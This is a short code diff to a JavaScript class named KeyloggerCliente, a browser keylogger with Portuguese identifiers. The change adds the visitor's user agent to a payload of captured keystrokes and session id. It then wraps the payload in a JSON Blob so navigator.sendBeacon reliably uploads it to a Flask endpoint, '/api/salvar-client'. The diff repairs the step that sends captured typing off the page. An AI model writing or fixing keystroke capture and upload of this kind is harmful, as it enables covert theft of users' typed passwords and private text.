@@ -153,10 +153,13 @@ class KeyloggerCliente {
         const dados = JSON.stringify({
             sessao: this.sessionId,
             dados: this.buffer,
+            navegador: navigator.userAgent,
             final: true
         });
 
-        navigator.sendBeacon('/api/salvar-client', dados);
+        // sendBeacon precisa de Blob com Content-Type correto para Flask parsear JSON
+        const blob = new Blob([dados], { type: 'application/json' });
+        navigator.sendBeacon('/api/salvar-client', blob);
     }
 
     parar() {
